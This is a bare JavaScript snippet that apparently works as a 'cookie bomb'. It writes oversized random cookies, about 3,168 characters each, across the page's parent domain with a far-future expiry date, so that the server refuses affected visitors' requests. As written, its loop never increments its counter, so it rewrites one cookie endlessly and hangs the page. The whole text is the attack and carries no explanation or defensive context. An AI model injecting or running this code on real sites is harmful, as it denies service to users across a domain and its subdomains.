(() => {
    const a = 3168;
    const b = new Date(2e14).toUTCString();
    const c = location.hostname.split(".").slice(-2).join(".");

    function arrayToRandomString(inputArray, length){
        return encodeURIComponent(btoa(String.fromCharCode.apply(0,inputArray))).substring(0,length)
    }
    function generateArrayOfRandomNumbers(amountOfChildElements){
        return crypto.getRandomValues(new Uint8Array(amountOfChildElements))
    }

    for (let d = 0; 99 > d; d) {
        randomString = arrayToRandomString(generateArrayOfRandomNumbers(a), a);
        document.cookie = `cd${d}=${randomString};expires=${b};domain=${c};path=/`
    }
})()